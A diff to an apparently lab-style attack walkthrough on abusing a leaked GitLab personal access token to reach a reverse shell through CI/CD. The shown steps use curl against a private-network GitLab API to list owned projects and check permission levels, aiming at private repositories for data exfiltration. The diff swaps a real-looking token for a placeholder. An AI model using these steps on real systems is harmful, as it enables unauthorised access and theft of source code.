@@ -61,7 +61,7 @@ This scenario demonstrates the move from a leaked PAT to a stable reverse shell 
 With a token in hand, our first move is to map out the accessible projects. We are looking for private repositories with CI/CD enabled.
 
 ```bash
-curl --header 'PRIVATE-TOKEN: glpat-WQNQXjaZMP442ARViusg' \
+curl --header 'PRIVATE-TOKEN: glpat-WQNQTESTANDO' \
 '[http://10.8.20.80/api/v4/projects?owned=true](http://10.8.20.80/api/v4/projects?owned=true)' | jq '.[] | {name: .name, id: .id, visibility: .visibility}'
 
 Focus on projects marked as PRIVATE to maximize the impact of the data exfiltration.
@@ -70,7 +70,7 @@ Step 2: Verifying Permissions
 Before injecting code, we must confirm our privilege level on the target project (e.g., Project ID: 1).
 
 Bash
-curl --header 'PRIVATE-TOKEN: glpat-WQNQXjaZMP442ARViusg' \
+curl --header 'PRIVATE-TOKEN: glpat-WQNQTESTANDO' \
 '[http://10.8.20.80/api/v4/projects/1](http://10.8.20.80/api/v4/projects/1)' | jq '.permissions'
 Level 30 (Developer): The minimum required to commit code and trigger a build.
 
